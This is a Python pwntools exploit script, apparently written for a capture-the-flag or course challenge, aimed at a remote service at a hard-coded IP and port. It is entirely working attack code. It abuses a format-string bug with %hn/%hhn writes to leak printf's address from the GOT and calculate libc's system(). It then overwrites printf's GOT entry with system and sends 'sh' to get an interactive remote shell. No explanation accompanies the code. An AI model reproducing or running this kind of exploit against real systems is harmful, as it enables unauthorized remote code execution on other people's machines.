from pwn import *
import re

host = '140.115.59.7'
port = 11009
y = remote( host , port )

printf_got = 0x804a010
printf_offset = 0x49590
system_offset = 0x3ad80


def pp(pay):
    p = pay + '|END\n\x00'
    y.sendline(p)


y.recvline()
y.recvline()
y.recvline()

pp('%10$x')
_10 = y.recvuntil('|END\n')[:-5]
print _10
ad2 = _10[6:8]
print ad2

ad = hex(printf_got)[2:].rjust(8,'0')

a = '%.' + str( int( ad[4:] , 16 ) + 0x0 ) + 'x%10$hn'
pp( a )    #____xxxx + 10
y.recvuntil('END\n')
sleep(1)


a = '%.'+str(int(ad2,16)+2)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)+4)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

a = '%.' + str( int( ad[4:] , 16 ) + 0x2 ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)+6)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)-2)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

"""
a = '%.2052x%15$hn%.38924x%14$hn'  # 40976 - 2052 = 38924
pp( a )
y.recvuntil('END\n')
sleep(1)
"""

pp( '%14$s' )
leak = y.recvuntil('END\n')
log.info(leak)
printf_addr = u32(leak[:4])
log.info(hex(printf_addr))
sleep(1)

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset

log.success(hex(system_addr))

ad3 = hex(system_addr)[2:].rjust(8,'0')
log.success(ad3)

print int( ad3[:4] , 16 )
print int( ad3[4:] , 16 )


a = '%.'+str(int( ad3[4:] , 16 ))+'x%14$hn'+'%.'+str( int( ad3[:4] , 16 ) - int( ad3[4:] , 16 ) )+'x%15$hn'
pp( a )
y.recvuntil('END\n')
sleep(1)



y.sendline('sh\x00')



y.interactive()
